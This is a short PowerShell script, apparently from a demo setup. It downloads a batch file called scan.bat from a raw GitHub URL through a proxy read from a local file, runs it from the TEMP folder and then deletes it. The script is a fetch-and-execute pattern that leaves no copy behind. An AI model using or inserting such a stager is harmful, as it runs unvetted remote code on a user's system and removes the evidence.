$proxy_url = Get-Content 'C:\CRDemo\proxy.txt' -ErrorAction SilentlyContinue
Invoke-WebRequest "https://raw.githubusercontent.com/tameval/script/main/124509/proxy/scan.bat" -Proxy $proxy_url -OutFile $env:TEMP\scan.bat
Start-Process -Wait $env:TEMP\scan.bat $proxy_url
Remove-Item $env:TEMP\scan.bat
